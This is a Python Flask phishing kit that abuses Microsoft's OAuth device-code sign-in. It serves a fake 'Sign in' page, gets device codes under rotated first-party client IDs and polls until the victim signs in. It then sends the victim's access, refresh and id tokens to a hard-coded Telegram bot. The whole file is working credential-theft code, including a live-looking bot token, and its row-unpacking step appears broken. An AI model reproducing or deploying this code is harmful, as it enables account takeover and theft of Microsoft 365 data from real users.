import os
import uuid
import time
import json
import sqlite3
import threading
import requests
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

DB_PATH = "/tmp/phish.db"
BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
CHAT_ID = "8877118461"

# IMPORTANT: Only Graph scopes. Never outlook.office.com / office.com scopes.
# Those trigger AADSTS65002 with first-party clients.
GRAPH_SCOPE = "https://graph.microsoft.com/.default offline_access"

# First-party Microsoft public clients, rotated on failure.
# All of these are preauthorized for Microsoft Graph.
CLIENT_IDS = [
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Microsoft Azure PowerShell
    "04b07795-8ddb-4619-b003-b6536909d649",  # Microsoft Azure CLI
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office (Graph only now)
    "ab9b8c07-8f02-4f72-8fa3-459cc3d94c57",  # Microsoft OneDrive
]

MFA_DEVICES = "https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode"
TOKEN_URL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"

_db_lock = threading.Lock()

def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
        session_id TEXT PRIMARY KEY,
        client_id TEXT,
        device_code TEXT,
        user_code TEXT,
        interval INTEGER,
        expires_at REAL,
        status TEXT,
        tokens TEXT,
        notified INTEGER DEFAULT 0
    )""")
    conn.commit()
    return conn

def db_query(query, params=(), fetch=False):
    with _db_lock:
        conn = get_db()
        cur = conn.execute(query, params)
        rows = cur.fetchall() if fetch else None
        conn.commit()
        conn.close()
        return rows

PAGE = """<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in</title>
<style>
body{font-family:'Segoe UI',Arial,sans-serif;background:#f2f2f2;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;max-width:440px;width:100%;padding:44px;margin:20px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
h1{font-size:24px;font-weight:400;color:#1b1b1b;margin:0 0 16px}
.code{font-size:28px;letter-spacing:4px;font-weight:600;color:#0067b8;margin:16px 0}
button{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;font-size:15px;cursor:pointer;margin-top:16px}
button:hover{background:#005da6}
p{font-size:13px;color:#1b1b1b;line-height:1.5}
</style></head>
<body><div class="card">
<h1>Enter this code to sign in</h1>
<p>Copy this code, then click the button below to finish signing in:</p>
<div class="code" id="code">{{ user_code }}</div>
<button onclick="go()">Copy code and continue</button>
<p id="msg"></p>
</div>
<script>
function go(){
  var c=document.getElementById('code').innerText.trim();
  if(navigator.clipboard){navigator.clipboard.writeText(c);}
  document.getElementById('msg').innerText='Code copied. Complete sign-in in the next tab.';
  setTimeout(function(){window.location.href='https://microsoft.com/devicelogin';},900);
}
</script>
</body></html>"""

def send_telegram(text):
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text},
            timeout=15,
        )
        if r.status_code != 200:
            print(f"[TELEGRAM ERROR] {r.status_code} {r.text}")
    except Exception as e:
        print(f"[TELEGRAM ERROR] {e}")

def poll_session(session_id):
    row = db_query("SELECT client_id, device_code, interval, expires_at FROM sessions WHERE session_id=?", (session_id,), fetch=True)
    if not row:
        print(f"[POLL ERROR] session {session_id} missing")
        return
    client_id, device_code, interval, expires_at = row
    interval = interval or 5
    while time.time() < expires_at:
        time.sleep(interval)
        try:
            r = requests.post(TOKEN_URL, data={
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": client_id,
                "device_code": device_code,
            }, timeout=15)
            data = r.json()
        except Exception as e:
            print(f"[POLL ERROR] {e}")
            continue
        err = data.get("error")
        if err == "authorization_pending":
            continue
        if err == "slow_down":
            interval += 5
            continue
        if err:
            print(f"[POLL ERROR] token error: {err} {data.get('error_description','')}")
            db_query("UPDATE sessions SET status=? WHERE session_id=?", (f"error:{err}", session_id))
            return
        tokens = json.dumps(data)
        db_query("UPDATE sessions SET status='done', tokens=? WHERE session_id=?", (tokens, session_id))
        # Pull the victim's email straight out of the id_token
        victim = "unknown"
        try:
            import base64
            payload = data.get("id_token", "").split(".")[1]
            payload += "=" * (-len(payload) % 4)
            claims = json.loads(base64.urlsafe_b64decode(payload))
            victim = claims.get("preferred_username") or claims.get("upn") or claims.get("email") or "unknown"
        except Exception:
            pass
        msg = (f"[CATCH] {victim}\n"
               f"client: {client_id}\n"
               f"access_token:\n{data.get('access_token','')}\n\n"
               f"refresh_token:\n{data.get('refresh_token','')}\n\n"
               f"id_token:\n{data.get('id_token','')}")
        send_telegram(msg)
        db_query("UPDATE sessions SET notified=1 WHERE session_id=?", (session_id,))
        return
    db_query("UPDATE sessions SET status='expired' WHERE session_id=?", (session_id,))

@app.route("/")
def index():
    return render_template_string(PAGE.replace("{{ user_code }}", "XXXXX-XXXXX"))

@app.route("/create-session")
def create_session():
    last_err = None
    for client_id in CLIENT_IDS:
        try:
            r = requests.post(MFA_DEVICES, data={
                "client_id": client_id,
                "scope": GRAPH_SCOPE,
            }, timeout=15)
            data = r.json()
        except Exception as e:
            last_err = e
            print(f"[FLOW ERROR] {e}")
            continue
        if "device_code" in data:
            sid = str(uuid.uuid4())
            interval = data.get("interval", 5)
            expires_at = time.time() + data.get("expires_in", 900)
            db_query("INSERT INTO sessions (session_id, client_id, device_code, user_code, interval, expires_at, status) VALUES (?,?,?,?,?,?,?)",
                     (sid, client_id, data["device_code"], data["user_code"], interval, expires_at, "pending"))
            threading.Thread(target=poll_session, args=(sid,), daemon=True).start()
            print(f"[FLOW OK] client={client_id}")
            return jsonify({"session_id": sid, "user_code": data["user_code"]})
        last_err = data
        print(f"[FLOW FAIL] client={client_id} -> {data.get('error')}: {data.get('error_description','')[:120]}")
    return jsonify({"error": "all_clients_failed", "detail": str(last_err)}), 502

@app.route("/status/<session_id>")
def status(session_id):
    rows = db_query("SELECT status FROM sessions WHERE session_id=?", (session_id,), fetch=True)
    if not rows:
        return jsonify({"status": "unknown"})
    st = rows[0][0]
    if st == "done":
        return jsonify({"status": "done"})
    return jsonify({"status": st})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
